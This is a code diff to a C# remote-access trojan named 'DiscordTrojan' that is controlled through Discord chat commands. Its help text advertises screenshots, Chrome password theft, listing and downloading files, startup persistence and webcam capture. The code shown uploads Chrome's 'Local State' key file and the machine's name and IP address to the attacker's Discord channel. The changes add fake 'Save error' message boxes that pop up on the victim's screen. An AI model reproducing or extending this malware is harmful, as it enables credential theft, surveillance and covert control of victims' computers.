@@ -15,6 +15,7 @@ using System.Threading;
 
 
 
+
 namespace DiscordTrojan
 {
     
@@ -86,7 +87,7 @@ namespace DiscordTrojan
             {
                 var help = new EmbedBuilder();
                 help.WithTitle("Help");
-                help.WithDescription("!ping - pong\n\n!ScreenShot - show photo of desktop\n\n!get chrome passwords - returns a enycrypted password sheat\n\n!get info - shows basic info about the pc and network\n\n!send messagebox (message) - sends the user a message box\n\n!get files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!get file (directory) - returns the file you want to download\n\n!send startup true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera");
+                help.WithDescription("!ping - pong\n\n!ScreenShot - show photo of desktop\n\n!get chrome passwords - returns a enycrypted password sheat\n\n!Info - shows basic info about the pc and network\n\n!MessageBoxError (message) - sends the user a error message box\n\n!MessageBoxWarning (message) - sends the user a warning message box\n\n!get files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!get file (directory) - returns the file you want to download\n\n!send startup true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera");
                 help.WithColor(Discord.Color.Teal);
                 message.Channel.SendMessageAsync("", false, help.Build());
             }
@@ -104,15 +105,21 @@ namespace DiscordTrojan
                 message.Channel.SendFileAsync("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Local State");
             }
 
-            if (message.Content == "!get info")
+            if (message.Content == "!Info")
             {
                 message.Channel.SendMessageAsync("Machine name: " + System.Environment.MachineName + "\nIp adress: " + GetIp());
             }
 
-            if (message.Content.StartsWith("!send messagebox"))
+            if (message.Content.StartsWith("!MessageBoxError"))
             {
-                var arg = message.Content.Split(new[] { "!send messagebox" }, StringSplitOptions.None)[1];
-                MessageBox.Show(arg);
+                string arg = message.Content.Replace("!MessageBoxError", " ");
+                MessageBox.Show(arg, "Save error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                message.Channel.SendMessageAsync("Sent and read");
+            }
+            if (message.Content.StartsWith("!MessageBoxWarning"))
+            {
+                string arg = message.Content.Replace("!MessageBoxWarning"," ");
+                MessageBox.Show(arg, "Save error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 message.Channel.SendMessageAsync("Sent and read");
             }
 
